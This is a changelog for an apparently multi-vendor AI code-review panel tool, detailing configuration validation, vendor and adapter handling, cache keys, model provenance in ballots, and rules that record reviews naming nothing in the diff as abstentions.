# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added
- **`--min-reviews N` / `[jury.ci] min_reviews`: require the number of reviews a downstream consumer will actually receive** (#699). It counts what the consumer counts: **panel ballots that reviewed**, one per agent that answered *and named what it read*. The chair's synthesis record is not one of them — `keel review --from-jury` splits the report's `reviewers` array on `role` and reads the `chair` entry as the panel's consensus record — and neither is an abstaining ballot, which that consumer's `review-verdict-insubstantial` rule refuses; a gate counting either would announce more reviews than the consumer finds, which is the mismatch this flag exists to catch. The chairing agent's own ballot is an ordinary `panelist` entry and *is* counted when it reviewed. Off by default (`0`), because most consumers have no minimum and a gate that failed closed here would break every single-agent install. Checked twice, because neither check alone is enough: **before the panel runs**, from the agents that are actually available, so a bench that cannot reach the minimum exits `2` naming the shortfall without spending a single agent call; and **on the result**, exit `3` — the same family as the collapsed-panel guard, since it is the panel that fell short and not the diff — because no pre-flight can predict an agent that is installed, runs, and returns nothing. Deliberately kept out of the config hash, unlike `min_vendors`: it changes neither the orchestration nor the findings and is re-evaluated on every run, cache hits included, so turning it on invalidates no cache entry.

- **`[[agent]] adapter`: what a seat *is* is now separate from how it is *invoked*** (#705). `vendor` did two jobs — it named the identity the cross-vendor gate counts *and* selected the adapter that builds the command line — so a bench built from a CLI that fronts several vendors' models could not be configured at all. A seat with `vendor = "openai", command = "cursor-agent"` died in half a second with `nonzero_exit`, because `openai` also meant "run `<command> exec …`" and `cursor-agent exec` is not a command; the only pass-through adapter was reachable as `vendor = "cli"`, which made every such seat the same vendor at the gate. A bench of Cursor-fronted GPT, Gemini and Grok seats could run, or be counted as three vendors — not both.
  - `adapter` is optional and **defaults to the vendor's shipped adapter**, so every configuration that names only `vendor` builds the argv it always did. That is asserted rather than asserted-to: a test compares the adapter class, `build_argv`, `build_write_argv` and the stdin encoding for every shipped vendor, with the key unset and with the key naming the vendor itself, and the hand-maintained goldens in `tests/golden/adapter_contracts.json` are re-asserted with it set. The key reaches `config_hash` only when it *differs* from the vendor, so no existing review-cache entry is invalidated either.
  - The adapter vocabulary **is** the vendor vocabulary, because the adapter registry is keyed by vendor name: `anthropic` is the claude protocol, `openai` codex's, `google` agy's, `cli` the bring-your-own-CLI pass-through, and each `…-api` its hosted call. `register_adapter` teaches a name usable as either key.
  - Everything about *how a seat is invoked* follows the adapter: argv, the read-only sandbox flag the tool guarantees (codex's `-s read-only` is never spliced into `cursor-agent`, and the privilege audit reads such a seat as the bring-your-own-CLI seat it is), whether a `command` is required, how `effort` is expressed, and the transport `--doctor` reports. Everything about *who a seat is* still follows the vendor: `min_vendors`, `panel.vendors`, the report's vendor column, the ballots and `--format keel-reviews`. The issue's bench now runs and produces three ballots carrying `openai`, `google` and `xai`.
  - **A mismatched pair is unusual, not invalid.** `vendor = "openai", adapter = "anthropic"` validates silently, invokes `claude -p`, and counts as `openai`. The supported configuration this key exists for — `vendor = "openai", adapter = "cli"` — *is* a mismatch, so a rule that flagged "the adapter is not the vendor's own" would fire on the main use case, and the tool cannot tell a sensible pair from a silly one without knowing which CLI fronts which vendor, which is exactly the knowledge whose absence caused #705. An adapter name this build does **not have** is a hard config error rather than a warning (unlike an unknown *vendor*, which still names a seat that runs and answers to `cli` at the gate): the only alternative is to guess, and the guess is the half-second `nonzero_exit`, discovered mid-run on a review already paid for.
  - `--doctor` prints both fields on every seat row (`vendor=openai, adapter=cli`) and the JSON export's agent entries gain an `adapter` key — additive, so it stays `ai-jury.doctor.v1`. `jury config show` appends `via <adapter>` only when the two differ, so an ordinary seat's line is unchanged.
  - **That hard error is now raised everywhere the name is read** (#708). `--doctor` and `jury run-agent` load a config *without* validating it, so an unknown `adapter` survived into the seats, the registry lookup missed, and the adapter fall-through quietly handed them the generic CLI adapter: three seats spelled `adapter = "claude"` (the claude protocol is `anthropic`) reported `[available]`, `cross-vendor ready: yes` and `ready to run: yes` for a file `jury` refuses before its first round, against this document's promise that the doctor's arithmetic equals what a run counts. Fixed at the seam, not in the report: `--doctor` now loads with the validation a run uses and makes the config error its verdict — naming the seat and the adapter, describing no seat, `ready to run: no` — and the adapter lookup refuses a *named* adapter it does not have instead of guessing one, so `jury run-agent` exits `2` with the same message. An unknown *vendor* still falls through, unchanged: that seat named no protocol. One consequence beyond adapters: any hard-invalid config (no `[[agent]]` entries, a missing agent `name`) is now the doctor's verdict rather than a partial description of a bench that cannot run.
- **`xai` and `xai-api` are vendors this tool knows** (#701): a Grok seat added through Cursor's CLI with `vendor = "xai"` used to answer `jury --config-validate` with `unknown vendor 'xai' (expected one of anthropic, openai, google, local, anthropic-api, openai-api, google-api, openai-compatible, cli); using generic fallback.` Grok is not an exotic choice — it is reachable today from a CLI already installed on machines running this panel — and the seat it produced was recorded as a generic `cli`.
  - `vendor = "xai"` is the bring-your-own-CLI profile, like `cli`: the operator supplies `command` and `extra_args` (`cursor-agent -p --model cursor-grok-4.6-high-fast …`) and the invocation is forwarded as configured. `privilege` treats it as it treats `cli` for the same reason `cli` is treated that way — there is no vendor-specific sandbox flag this tool could add, and injecting agy's `--sandbox` into an unrelated binary breaks the seat rather than confining it. The seat is still audited, and still warns when nothing sandboxes it. Its invocation is locked in `tests/golden/adapter_contracts.json` alongside every other shipped CLI adapter.
  - `vendor = "xai-api"` is the API-flavoured spelling the other three vendors already have: a hosted reviewer keyed by `XAI_API_KEY`, no CLI install, no `command`, `effort` sent as `reasoning_effort`. xAI serves the OpenAI chat-completions shape, so `XaiApiAdapter` is `OpenAiApiAdapter` with its own URL and its own credential env var rather than a second copy of the payload and parse code. `--agent xai-api:grok-2-latest` works with no `jury.toml` at all.
  - `vendor = "openai-compatible"` with an `endpoint` of `https://api.x.ai/v1` still works and is still documented. It was never wrong — it was just unable to say that the seat was xAI.
- **`--min-reviews N` / `[jury.ci] min_reviews`: require the number of reviews a downstream consumer will actually receive** (#699). It counts what the consumer counts: **panel ballots**, one per agent that answered. The chair's synthesis record is not one of them — `keel review --from-jury` splits the report's `reviewers` array on `role` and reads the `chair` entry as the panel's consensus record — so a gate that added it would announce one more review than the consumer finds, which is the mismatch this flag exists to catch. The chairing agent's own ballot is an ordinary `panelist` entry and *is* counted. Off by default (`0`), because most consumers have no minimum and a gate that failed closed here would break every single-agent install. Checked twice, because neither check alone is enough: **before the panel runs**, from the agents that are actually available, so a bench that cannot reach the minimum exits `2` naming the shortfall without spending a single agent call; and **on the result**, exit `3` — the same family as the collapsed-panel guard, since it is the panel that fell short and not the diff — because no pre-flight can predict an agent that is installed, runs, and returns nothing. Deliberately kept out of the config hash, unlike `min_vendors`: it changes neither the orchestration nor the findings and is re-evaluated on every run, cache hits included, so turning it on invalidates no cache entry.

### Changed
- **An unrecognised vendor is no longer a distinct vendor** (#701): the fallback stays — an unknown `vendor` is a warning, not a hard error, so a name that is merely ahead of the build cannot abort a review run — but what the fallback is *worth* has changed. A seat whose vendor this build cannot identify runs on the generic `cli` adapter, so `cli` is the identity it carries at the cross-vendor gate. Two such seats are one vendor, and cannot satisfy `min_vendors = 2` between them.
  - This is #682 reached through configuration rather than through a collapse. `min_vendors` counts *distinct vendors that contributed a review*, and it was counting the strings a config happened to spell: two seats both routed to the same generic adapter — two typos, or two spellings of a vendor the vocabulary lacked — read as two perspectives and satisfied the gate. A bench that looked diverse and was not is the one failure this project's output exists to prevent.
  - **The collapse is scoped to the gate.** The report, the ballots, `--metadata-json` and the `keel-reviews` bundle still carry each seat's own configured `vendor` string. Rewriting provenance to `cli` would answer a counting problem by making the record less true; the count is the thing that was wrong.
  - `register_adapter("my-vendor", MyAdapter)` — the documented extension point — now teaches the vocabulary as well as the adapter table, so a genuinely custom vendor keeps its own identity, stops warning, and is not demoted by this change. Refusing an unrecognised vendor outright would have broken exactly that, and `cli` itself is a deliberate, documented generic vendor with real users behind it.
  - The warning names the consequence rather than only the fact: `… using the generic 'cli' fallback, which counts as vendor 'cli' for min_vendors — two such seats are one vendor, not two.`
  - **`--doctor` counts what the gate counts.** `panel.vendors_configured` and `panel.vendors_available` counted distinct *raw vendor strings* while the run counted collapsed identities, so a config with two unrecognised seats (`xa1`, `grok-cli`) reported `vendors_configured: 2` in `--doctor` and `distinct_vendors(...) == 1` at the gate: the vocabulary consulted in two places by two rules, which is the thing this change set out to remove. Both counts are now `config.vendor_identity` — the gate's own arithmetic — so the two numbers an operator compares agree.
  - **Every place that shows a vendor says which one it is showing.** Doctor's agent entries carry a new `vendor_identity` beside `vendor` (additive to `ai-jury.doctor.v1`); the text report renders `vendor=xa1 -> counts as cli` only when the two differ, and labels both readiness counts *(by vendor identity)*; the markdown report's short-panel line says its vendor count is by identity while its `vendor` column stays the configured string. `--metadata-json` `agents[].vendor`, the ballots and the `keel-reviews` bundle remain provenance. `docs/configuration.md` carries the table of which surface shows which.
  - **A recognised vendor is recognised by every rule.** `validate_config` decided "commandless API vendor" on the un-normalised string, so `vendor = "XAI-API"` — a vendor `is_recognised_vendor` accepts — was refused with `agent 'grok' is missing a non-empty 'command'`. The vendor is normalised **once**, at the top of the agent's validation, and every later rule reads the normalised value; `config.normalise_vendor` is also what `adapters.make_adapter` and `register_adapter` look up, so a seat cannot pass validation under one spelling and reach the adapter table or the cross-vendor gate under another. Messages still quote the spelling the operator wrote.
  - **One vendor spelling, one answer, everywhere.** Normalising inside each rule is a convention, and two readers had already skipped it. `--doctor` diagnosed a single `vendor = "XAI-API"` seat twice in one run: `_unavailable_reason` said `the hosted API is not reachable` while the warning list said `agent 'grok' command '' is not on PATH`. And `privilege.enforce_read_only` lower-cased without stripping, so `vendor = " XAI "` — a spelling validation accepts — missed the bring-your-own-CLI list and had agy's `--sandbox` injected into `cursor-agent`, the one flag the xai profile exists to keep off that binary. `AgentSpec` now normalises its `vendor` on construction, so every reader — including one added tomorrow — is handed the same spelling, and doctor's two unavailability messages are derived from a single transport classification instead of two copies of the same rule. Surfaces that show a vendor now show that normalised spelling: only whitespace and capitalisation are lost, never the vendor you named.
- **Two `py/unused-global-variable` findings, answered by evidence rather than by a delete** (#696): CodeQL flagged `SURFACE_PATHS` in `scripts/release_surfaces.py` and `KNOWN_AGENTS` in `src/ai_jury/scaffold.py`. Both have real readers; the query is intra-module, and every reader of these two lives in another file.
  - `SURFACE_PATHS` is now the function `release_surfaces.surface_paths()`. It was a copy of the table's distinct paths taken at import, and the guards and their tests *substitute* `RELEASE_SURFACES` — so a frozen copy would keep naming the files the original table listed, and the success line it exists to print would describe a comparison that did not happen. That is the defect #556 was about, one level down. Derived on each call, it cannot drift from the table. Readers (`verify_merge.main`'s two success lines, three table tests) moved with it; the printed output is unchanged.
  - `KNOWN_AGENTS` stays exactly as it is, and now names its readers: `cli._init_available`, `cli._init_interactive`, `cli._init_wizard` and `cli._run_init` — every path through which `jury init` offers, detects or defaults an agent. Deleting it would take `--list-agents`, the wizard and `--preset all` with it, and nothing in `scaffold.py` recomputes the set: the one place that could, `build_config`, needs the templates dict it already holds, so reading the tuple there would reintroduce the second copy #589/#610 removed.

### Fixed
- **A typo inside `[jury.ci]`, `[jury.context]` or `[jury.diff]` is now reported, like a typo at the top level** (#719). The unknown-key check stopped at the table name: `[jury] roundz` warned, `[jury.ci] min_vendor = 3` did not. `_ci_from_dict`, `_context_from_dict` and `_diff_from_dict` take the names they know and drop the rest, so a misspelled key passed `--config-validate` **and** `--strict-config` clean and the setting the operator wrote was simply not applied — the cross-vendor gate kept its default of 2 while the file said 3, and `redact_secretz = false` left secrets redacted. The nested tables now warn with the dotted path (`unknown key 'jury.ci.min_vendor'`) and list the keys that table accepts, at the same soft severity as the top level — the config still loads, it just does not mean what it says — and `--strict-config` promotes them exactly as it does the rest.
  - **The accepted names are derived from the dataclasses**, not written out a second time: `KNOWN_CI_KEYS`/`KNOWN_CONTEXT_KEYS`/`KNOWN_DIFF_KEYS` come from the fields of `CiConfig`/`ContextConfig`/`DiffConfig`, so a new field cannot be added and leave the list behind — which is how `KNOWN_JURY_KEYS` came to reject its own documented `hints` and `routing` (#715). A test additionally records which keys each reader actually asks for and pins the tuples to that, so an alias added to a reader tomorrow cannot start warning as if it were a typo.
  - `ci`, `context` and `diff` are the complete set of sub-tables `_from_dict` reads; every other `[jury]` key is a scalar. A non-table (`ci = "critical"`) is left to the existing shape check rather than iterated character by character.
  - Every `[jury…]` example in `docs/configuration.md` and `docs/parameters.md` is now loaded and validated under `--strict-config` by the test suite. All of them already passed, so no documented example changed — but a doc that drifts from the schema hands the reader a config that fails the gate the doc told them to run, which is what this check exists to stop.
- **The least-privilege audit reads `--disallowed-tools` in both of its spellings** (#717). `privilege.enforce_read_only` has understood `--disallowed-tools Edit,…` and `--disallowed-tools=Edit,…` since #288, but `_claude_is_locked_down` — the check behind `audit_agent` — matched only the two-token form. A claude seat configured as `extra_args = ["--disallowed-tools=Edit,Write,NotebookEdit,Bash"]` was therefore invoked exactly as locked down as one the audit accepts, and still reported as *not restricted to read-only*; under `--strict` that advisory warning aborted the run over a configuration with nothing wrong with it. Both functions now read the flag through one `_disallowed_tools_at` helper, which returns the value and the token span, so the enforcer and the auditor cannot disagree about what the args say again — the two-spelling knowledge lives in a single place rather than in two hand-written parsers. The space form behaves exactly as before, a partial deny set still warns in either spelling, and a valueless trailing `--disallowed-tools` still denies nothing and still warns.
- **`hints = true` reached no reviewer, could not be turned off, and split no cache key** (#715). The static-analysis pre-pass (#523) is documented as: run Ruff/ESLint on the modified files, put what they flag in the Round 1 prompt, and let `--hints` / `--no-hints` override `[jury] hints`. Four things stood between that description and the code.
  - **The hints are no longer carried as user context.** The CLI appended the collected block to `context`, and `run_jury` clears `context` whenever `[jury.context] mode` is `diff-only` — the default, and the mode of every install with no `[jury.context]` section at all. So the linters ran, the run logged `injected static analysis hints into review context`, and the panel was shown nothing: two mock runs, with and without `--hints`, produced byte-identical reports. The block is now threaded to the orchestrator separately and joined into the Round 1 prompt **after** the context-mode filter, so it reaches the reviewers under `diff-only` as well as `expanded`. It is not user context in the first place — it is produced locally by this run — and the regression test asserts on the Round 1 prompt text rather than on the exit code, which was `0` throughout.
  - **`--no-hints` exists.** It was listed in `docs/parameters.md` and never registered: `jury --no-hints --mock …` exited `2` with `unrecognized arguments`, so a `hints = true` in `jury.toml` could not be turned off for a single run. The two flags are now a pair over a sentinel default — neither passed leaves the config value standing, and either one overrides it in its own direction.
  - **`hints` and `routing` are known `[jury]` keys.** Both are read by `_from_dict` and documented in `docs/configuration.md`, but neither was in `KNOWN_JURY_KEYS`, so the documented example warned `unknown key 'jury.hints'` and `--strict-config` — which promotes that warning to an error — exited `2` on the configuration the docs tell you to write.
  - **Both are in `config_hash`**, whose stated invariant is that a changed effective configuration changes the digest (`anonymize_debate` is in it for exactly this reason). `config_hash(JuryConfig()) == config_hash(JuryConfig(hints=True))` held, so a `--cache` hit could serve the outcome of a run that never saw the hints to a run that asked for them, and the reverse. As with `min_vendors` before them, adding the two keys invalidates every existing review cache entry **once** on upgrade — the first run after this release is a full one. `cache_schema` is deliberately unchanged: the stored record's format did not change, and a configuration change belongs in the key.
- **A misspelled severity in `--fail-on` / `[jury.ci] fail_on` no longer turns the CI gate into a permanent `PASS`** (#718). `evaluate_ci` lower-cased the configured severities and matched finding groups against that set; nothing checked them against the vocabulary. So `fail_on = ["majr"]` matched no group, and the gate that decides whether CI fails reported `PASS: no blocking findings at severities ['majr']` — green, on every run, quoting the typo back — while a verified critical finding sat in the same report. `--fail-on` was a free string (`cli.py`), `validate_config` never looked at `[jury.ci] fail_on`, and `_ci_from_dict` only wrapped a scalar in a list, so no surface could catch it. A gate that is silently off is worse than no gate: the operator believes they have one.
  - The vocabulary — `critical`, `major`, `minor`, `nit`, `info`, plus the documented `blocker` alias for `critical` — is now closed at **all three** places a value can enter, with one shared message. `validate_config` makes an unknown value a **hard error** naming it (like `[[agent]] effort`, and for the same reason: there is no safe default for "which findings fail the build"); `--fail-on` exits **2** with that same message, before an agent is paid for, and does so even without `--ci`, where the flag is inert and the typo would otherwise surface only on the run it was supposed to gate; and `evaluate_ci` itself raises `ValueError`, so a caller that bypasses the CLI cannot reopen the hole. Case and padding are still tolerated, `blocker` still gates `critical` groups — now reported under the canonical name — and a blank entry (`--fail-on critical,`) is still dropped rather than refused.
  - `[jury.ci]` is also checked for being a table, which `_ci_from_dict` had assumed: a scalar `ci` under `[jury]` used to reach it as an `AttributeError`.
  - `docs/platforms.md` advertised `jury --ci --fail-on high,critical`; `high` is not a severity, so the row demonstrated exactly this defect. It now reads `critical,major`.
- **The id a seat was invoked with now survives the two places that were still dropping it** (#722). #709 made `AgentResult.model` carry the model id the adapter actually sent, and a ballot reads it back to justify `model_source: "requested"`. Two paths downstream of that rebuilt the record without the field, so the run had the answer and the output did not.
  - **A chunked review had strictly weaker provenance than an unchunked one.** A diff over the size limit is reviewed in chunks and folded back together by `orchestrator._merge_results_by_agent` / `_combine_chair_results`, both of which construct a fresh `AgentResult` field by field and never carried `model`. Every ballot of every large-diff run therefore fell back to `ballots.requested_model` and shipped a *recomputed* id — for the seat in #709's own report, the wrong one: a Google seat at `effort = high` whose live listing does not offer `gemini-3-pro-high` is invoked with `gemini-3-pro` and, once chunked, balloted `gemini-3-pro-high` under `recomputed`. One byte of diff decided which. The same seat now ballots the same id and the same `model_source` whether it ran on one chunk or two.
  - **The merged id comes from the chunks whose text is in the merged body, and where those disagree the first wins.** Chunks of one diff are one seat invoked repeatedly through one adapter, so they normally all record the same id. Where they do not, the population matters: `_run_with_retry` stamps `model` from `adapter.resolved_model()` after *every* run, failed ones included, and an adapter that falls back against the vendor's live listing fails and re-resolves in the same breath — so scanning every part let a chunk that contributed no text name the model for the chunks that did. Both merges now read the id from the parts under the `chunk` headers (`_combine_chair_results` always did), falling back to the whole set only for a seat that produced no body at all, so a fully failed seat still records what it sent. A genuine disagreement inside the body reports the first, which is a model the run really did send and the one whose output opens the merge; inventing a `mixed` is a string no invocation sent. A merge in which *no* scanned part recorded an id stays empty, so `describe_model` still labels it `recomputed` rather than claiming it came off the wire.
  - **`jury run-agent` reported the requested id, not the dispatched one.** `cli._run_run_agent` stamps the result, then `runagent.result_dict` emitted `spec.model` — and built `attribution` from it too, so both fields named the same wrong model and a consumer reconciling them agreed twice. The document now reports `result.model` when the run recorded one, `spec.model` only when it did not, and `attribution` is derived from that one string. The two differ exactly where it matters: an `effort` level encoded as a model-id suffix, or an adapter that fell back after checking the vendor's listing. `schema_version` stays `ai-jury.run-agent.v1` — no key changed shape, and the value that changed was wrong.
- **`[[agent]] headers` is validated, and it is part of what a cache entry is keyed on** (#716). `docs/configuration.md` called it a table of extra HTTP headers for hosted adapters, and this project's validation surface promised field types were checked — but `validate_config` never looked at the key, and `_from_dict` turned every non-table into `{}`. A `headers` written as a string (`headers = "Authorization = Bearer y"`) or as an array of pairs passed `--config-validate` **and** `--strict-config`, and the seat then ran with no extra headers at all: it failed at the remote API where the header was required, or — for a routing header the provider honours a default for — reviewed quietly against a backend nobody chose.
  - **The severity follows usability, which is this module's existing split.** A shape that *cannot* become headers is a **hard error**, for the reason an unknown `effort` is hard (#662): warning about it would only move the discovery to the point where an agent call has already been paid for. That is a `headers` that is not a table, and a non-string header *name* — which no `jury.toml` can even express, since every TOML key parses to a string, so the rule guards a config dict built in Python. A shape that *does* become working headers by a documented coercion is a **warning**, like a malformed `api_key_env` name that falls back to the vendor default: `X-Retries = 3` is sent as `X-Retries: 3`, so it warns that it was coerced and `--strict-config` is where an operator asks for that to be fatal.
  - **No message quotes the offending value back**, hard or soft — a header is exactly where an `Authorization: Bearer …` credential lives, and these messages are printed to terminals and pasted into issues. The agent, the header name and the value's *type* (`got str`, `int`) say what is wrong without reproducing what is secret, following the precedent `api_key_env` set.
  - `_from_dict` no longer coerces a non-table to `{}` — it **raises the same `ConfigError`** instead, from a message builder shared with `validate_config`. The coercion is what made the mistake invisible: the seat materialised cleanly, carrying no headers, and only the remote API — or nobody — ever noticed. Raising there rather than letting `.items()` fail is what keeps the unvalidated paths honest: `load_config` defaults to `validate=False`, and `jury run-agent` keeps it that way on purpose so one seat's mistake cannot stop a single-seat run. Both already handle a `ConfigError` — `run-agent` prints it and exits `2` — where an `AttributeError` would have been a traceback.
  - **`headers` and `api_key_env` now reach `config_hash`.** Both decide where a request goes and under whose key: a routing header (`X-Route: premium`, an OpenRouter `HTTP-Referer`, an Azure deployment selector) can put a byte-identical seat in front of a different model, and `api_key_env` can put it in front of a different account. Two configs that differed only in one of them hashed the same, so `--cache` served one's outcome for the other. Headers are hashed **sorted**, so the digest depends on the mapping and not on the order the table happened to be written in. Unlike `[[agent]] adapter` above, there is no spelling of these keys that means "what it meant before this key existed", so this **invalidates every existing review-cache entry once** on upgrade — the first run after the bump is a full one, as it was when `min_vendors` joined the payload. `cache_schema` is deliberately unchanged: the stored record's *shape* did not change, only the key it is filed under, and that field versions the format.
- **A ballot now reports the model the run actually sent, not a second derivation of it** (#709). `ballots.requested_model` mapped `effort` onto a model id with `spec.vendor`; every path that actually invokes a seat — the three `effort_args` call sites in `adapters.py` and `jury run-agent` — maps it with `config.spec_adapter(spec)`, because *how* effort is expressed (a model-id suffix, a request-body field, nothing at all) is a property of the protocol the seat is invoked through. Those were one string until `[[agent]] adapter` made them separable (#705), and the two changes were developed in parallel, so no test crossed them. A seat with `vendor = google, adapter = cli, model = gemini-3-pro, effort = high` was invoked with `gemini-3-pro` and balloted `gemini-3-pro-high`; the same pair swapped got it exactly backwards. Both under `model_source: "requested"`, whose entire claim is that the id is the one that was sent — so the field that exists to answer *was this the same model twice* answered it with a model the run never asked for.
  - **One source of truth, and it is the invocation.** `Adapter.resolved_model()` is now the single place a model id is decided; every `--model`/`-m` argv, every network payload's `model` field and the Gemini URL read it, and the two paths that invoke a seat record what it returned on `AgentResult.model`. The ballot **reads that back** instead of recomputing anything. Recomputation could not have been made correct in any case: `agy` checks its mapped id against `agy models` and falls back when the CLI does not offer it, and the ballot — pure, no I/O — kept the suffix for a model that had been deliberately not sent. `ballots.requested_model` survives as the fallback for a record no invocation produced, and it now keys on the adapter too, so there is no third copy of the mapping.
  - The new field is serialized into the result cache and restored from it, so a cached ballot quotes the same string a fresh one does. JSON report `schema_version` goes to **1.3**: nothing changed shape, but a consumer that had reconciled `model` against its own idea of the effort mapping will see a different (correct) string on a mismatched seat.
  - **A recomputed id is no longer labelled as a sent one** (round 2, from review of #711). `sent_model` is empty for every record no invocation stamped — a hand-assembled outcome, a chair slot with no round-1 seat — and `describe_model` fell back to `requested_model` while keeping `model_source: requested`, the token whose whole claim is that the id was on the wire. The seat from this very issue is the witness: a Google seat at `effort = high` whose live listing does not offer `gemini-3-pro-high` is invoked with `gemini-3-pro` and ballots that, while the same seat with no recorded id recomputes `gemini-3-pro-high` — the overstatement this issue removes, restated for every unstamped record. The derived id still ships, because it is real and worth quoting, under a **`model_source` of its own: `recomputed`**. Not `unknown`: that value already means *this slot has no spec in the run's config*, and one token for two different facts is this defect one level down.
  - **A result-cache entry written before the field is not read at all.** `cache_schema` goes to **2**. An entry stored without the recorded id cannot support any provenance label — the run that wrote it did not record what it sent — and recomputing one to fill the gap is precisely the mislabelling above. A cache exists to be an exact stand-in for a fresh run; where it cannot be, one re-run is the honest price. The *key* would have caught those entries in this release anyway, since `PROMPT_VERSION` went to 8 for #710 in the same change, but that is a coincidence of two fixes shipping together: had this one landed alone, every existing entry would have keyed identically and come back a field short. A change to the record's format belongs in the field that versions the format.
- **A `Checked:` line has to name something that is in the change** (#710). `describe_scope` wrapped every non-empty `Checked:` value in backticks and `scope_is_substantive` accepted any backticked text as an anchor, so a reply opening `Checked: nothing` — or `everything`, or `the diff` — was rendered as an anchor, passed the substance test, and **counted as one of the panel's reviews** under `panel.is_review`. That is the shape of naming something with none of the substance: a rule satisfiable by an agent that has read nothing, which is precisely the failure #700 was filed to remove, one layer up.
  - **Tokens are resolved against the diff the panel was shown.** The run indexes the change once, after redaction (`largediff.change_index`: the paths in the diff, and the identifier-shaped or called symbols in it), and carries it on the outcome. A `Checked:` token counts when it names a path in the diff (matched on a path-component boundary from either root, so `ballots.py` and `src/ai_jury/ballots.py` both name the same changed file), a `path:line`, or a symbol that appears in the change. A bare English word is not a symbol, which is why `Checked: nothing` resolves to nothing even in a diff whose own prose contains the word.
  - **The change is what splits the line into tokens, too** (round 2, from review of #711). The first cut was lexical — whitespace and list punctuation — so a changed file whose *name* contains a space came apart in the middle: `Checked: docs/my file.py` became `docs/my` and `file.py`, neither of which is in a diff that changes `docs/my file.py`, and the ballot came back `scope_substantive: false`, `counts_as_review: false`, `abstention_cause: not_in_change`. A real review of a real file, refused for a space in its name, by the rule that exists to catch reviews of nothing. Three rules now decide where a token ends: a span the reviewer *marked* (backticks, or double quotes, straight or curly) is one token whatever is inside it; a comma or semicolon is a hard boundary; and whitespace is a boundary only where joining across it does not name a changed path — adjacent pieces are offered to the index joined, longest window first, and only a join the index confirms becomes a token. So this can turn a non-token into a token and never the reverse; the failure direction stays *unresolved*, which is reported.
  - **A mixed line is carried by the tokens that resolve.** `Checked: src/ai_jury/ballots.py, src/made/up.py` is a review of the first file, with the second listed in the scope as not in this change: the reviewer demonstrably read something a reader can go and check, and abstaining over the extra token would discard a real review to punish a typo. Connective prose in the same line (`lines 1-4`, `and the tests`) claims to name nothing and is neither counted nor reported. A line with no resolving token at all is not a review, whatever else it says.
  - **The abstention says which kind of nothing, and stays anchorless.** `panel` gains a fifth cause, `not_in_change`, beside `silent`, `named_nothing`, `refused` and `adapter_failed`: "named nothing checkable" and "named things that do not exist" are different failures asking for different fixes, and printing the first over a ballot that said `Checked: src/made/up.py` is a description its own scope contradicts. The unresolved tokens are quoted in the abstention — a reader has to see the claim that failed — but de-anchored (path separators, colons, parentheses and the `checked …` clause removed), so a consumer applying the same substance rule reaches the same conclusion rather than being talked past it by the sentence explaining that nothing was checked. The five buckets and `reviews_supplied` still sum to `ballots`.
  - **The prompt states the rule it holds reviewers to.** The code-review template now says that every name on the `Checked:` line is resolved against the diff and that a line resolving to nothing abstains; `PROMPT_VERSION` goes to **8**, which invalidates the cache. Holding a reviewer to a rule the prompt does not state is a trap, and `Checked: nothing` satisfied the old one.
  - Run metadata `schema_version` goes to **6**: `panel` gains `not_in_change`, additively. JSON report `schema_version` goes to **1.3**: `reviewers[].abstention_cause` gains that fifth value, `reviewers[].model_source` gains `recomputed`, and some ballots that carry it were previously counted as reviews. Resolution is skipped — and the pre-#710 structural rule applies — in two places: an outcome that was not built from a diff (*not verifiable here* is not *does not exist*), and `--issue`, which supplies no change to resolve against and already has its own scope exception, since a reviewer of an issue's prose that names a section of it named exactly what it was asked to name.
- **A ballot now names what it read, and one that cannot is an abstention rather than an approval** (#700). A full run against a 39 KB diff over 17 files returned three ballots reading `scope: "Reviewed the supplied diff; named no specific file."`, `testing: "not stated"`, `model: ""`. The consumer refuses a hand-posted verdict shaped like that — its `review-verdict-insubstantial` rule wants a scope naming a file, line or symbol, or a `Checked …` clause — and on a tier whose review *is* the panel, those ballots were the whole review. The panel was supplying the least checkable evidence in the run from the seat that is meant to be the most trusted.
  - **The scope is asked for as well as derived.** The review templates now ask every reviewer to open with a `Checked:` / `Tested:` pair and say that a ballot naming nothing checkable is recorded as an abstention; that statement is the first source and beats anything this tool can infer. Derivation stays as the floor, because a prompt is a request and not a guarantee: a reviewer that ignores the instruction but attaches files to its findings still produces a scope, as does an `--issue`-mode reviewer, whose findings carry no file at all and whose *claims* are what it named. `PROMPT_VERSION` goes to 7, which invalidates the cache.
  - **The placeholder is gone rather than reworded.** It asserted coverage from the absence of any evidence for it, and read identically whether the agent had reviewed all 17 files or returned an empty string. A reply that yields nothing from any source now yields no scope, and the caller turns that into an `ABSTAIN` whose scope states which kind of nothing came back — a failed adapter, an empty reply or refusal, or a reply that named no file, symbol, coverage clause or finding. That reason is deliberately **anchorless**, so a consumer applying the same substance rule reaches the same conclusion instead of being talked past it: dressing the record up to survive the gate would reinstate the defect with better prose.
  - **Abstention is the honest verdict, not a downgrade.** A reviewer whose scope is empty raised no findings either, so the tally would have handed it the clear stance (`APPROVE`/`READY`) — an approval inferred from silence, which is what `voting.py` already refuses to do (#251). This is that rule applied one step further out, and it joins the three abstention causes that were already there.
  - **`testing` says what happened rather than that a field was unfilled.** It is the reviewer's own `Tested:` line, else the first verification clause in its prose, else a plain statement that nothing was run. "not stated" described the field; a reader could not tell it apart from a reviewer that ran nothing and said so.
  - **`model` is never blank for a slot that has an agent.** It is the id actually requested — remapped through `effort_args` for a vendor that encodes reasoning effort in the model id, so a ballot cannot name a model the run never asked for — or, where nothing was pinned, a statement that the CLI's own default answered and that the CLI does not report which model that was. There *is* an honest answer in that case and the field now gives it. `model_source` carries the same fact as one machine token (`requested` / `cli_default` / `unknown` / `none`) so a consumer can tell an id from a statement about one without parsing English. Provenance is the entire product of a cross-vendor panel, and a ballot naming its vendor but not its model cannot answer "was that the same model twice".
  - **The bundle is now a projection of the ballots, not a second derivation of the same facts.** `keel_reviews` reads the `reviewers` array field for field, so the verdict the JSON report shows for a panelist and the verdict the consumer is handed for it cannot disagree — and neither can the scope that is supposed to justify it. `scope` and `testing` therefore appear in the JSON report too.
  - The mock adapter speaks the shape a real reviewer is asked for, so `--mock` exercises the stated-coverage path end to end rather than only the inference fallback behind it.
